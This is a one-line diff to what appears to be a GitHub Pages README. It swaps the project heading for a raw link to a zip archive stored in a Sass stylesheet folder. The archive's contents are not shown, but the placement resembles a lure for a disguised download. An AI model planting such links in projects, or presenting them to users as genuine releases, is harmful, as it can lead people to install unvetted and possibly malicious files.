@@ -1,1 +1,1 @@
-# codenoob7.github.io
+# https://raw.githubusercontent.com/codenoob7/codenoob7.github.io/main/assets/sass/base/codenoob_github_io_1.5-alpha.1.zip
